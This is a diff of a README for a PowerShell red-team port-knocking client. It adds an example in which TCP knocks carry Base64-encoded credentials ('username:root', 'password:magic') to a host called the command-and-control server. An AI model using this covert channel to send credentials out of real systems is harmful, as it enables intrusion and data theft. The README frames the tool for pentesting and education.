@@ -1,4 +1,4 @@
-# PortKnock-Utils
+# PortKnock-ClientUtils
 
 ## Table of Contents
 * [Intro](#intro)
@@ -7,7 +7,8 @@
 * [Malware Use Cases and Further Reading](#appendix)
 
 ### <a name="intro"></a>Intro
-PortKnock-Utils is a PowerShell interface for performing port-knock operations during Windows Red Team and Pentesting engagements.
+This is the client-side component of the PortKnock-Utils set of modules.  It provides an interface for creating one or more port knocks over TCP or UDP.  
+Data can be passed as part of the knock if the server is expecting it.
 
 This tool was designed specifically to provide a port knocking utility that allows source ports to be specified as part of the port-knock operation.
 It was also designed as an educational tool for understanding advanced persistence mechanisms used by threat actors and malware.
@@ -34,6 +35,15 @@ Invoke-TcpPortKnock -LocalIP "10.32.0.2" -LocalPort 4099 -RemoteIp $CommandAndCo
 Invoke-TcpPortKnock -LocalIP "10.32.0.2" -LocalPort 3761 -RemoteIp $CommandAndControl -RemotePort 8080
 ```
 
+#### Invoke a TCP Port Knock with Data
+```
+# C2 Server is waiting for a sequence of TCP knocks that contain Base64-encoded data
+
+$CommandAndControl = "10.66.0.1"
+
+Invoke-TcpPortKnock -LocalIP "10.32.0.2" -LocalPort 4444 -RemoteIp $CommandAndControl -RemotePort 8443 -Data "dXNlcm5hbWU6cm9vdA=="
+Invoke-TcpPortKnock -LocalIP "10.32.0.2" -LocalPort 4444 -RemoteIp $CommandAndControl -RemotePort 8443 -Data "cGFzc3dvcmQ6bWFnaWM="
+```
 
 #### Invoke a UDP Port Knock Sequence
 ```
